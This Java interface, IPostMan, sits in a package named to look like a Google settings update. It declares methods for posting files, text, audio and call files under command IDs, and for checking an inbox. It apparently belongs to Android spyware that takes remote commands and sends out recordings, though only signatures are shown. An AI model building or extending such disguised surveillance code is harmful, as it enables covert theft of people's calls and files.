package com.setting.dl.google.googlesettingupdate.ptt.kahverengi;

import com.setting.dl.google.googlesettingupdate.ptt.box.ICommandsDeleter;
import com.setting.dl.google.googlesettingupdate.ptt.box.IHaveCommand;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.IFilesCheckers;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.ICheckSent;
import com.setting.dl.google.googlesettingupdate.ptt.command.ICommandEditor;

import java.io.File;

public interface IPostMan extends IFilesCheckers, ICheckSent, ICommandEditor, ICommandsDeleter, IHaveCommand {
   
   void postTextFile(File file);
   void postTextFile(File file, String commandId);
   
   void postFile(File file);
   void postFile(File file, String id);
   void postFile(File file, String subject, String body, String commandId);
   
   void postAudio(File file);
   void postAudio(File file, String commandId);
   
   void postText(String title, String text);
   void postText(String title, String text, String commandId);
   
   void postCall(File file);
   void postCall(File file, String commandId);
   
   void checkInbox();
}
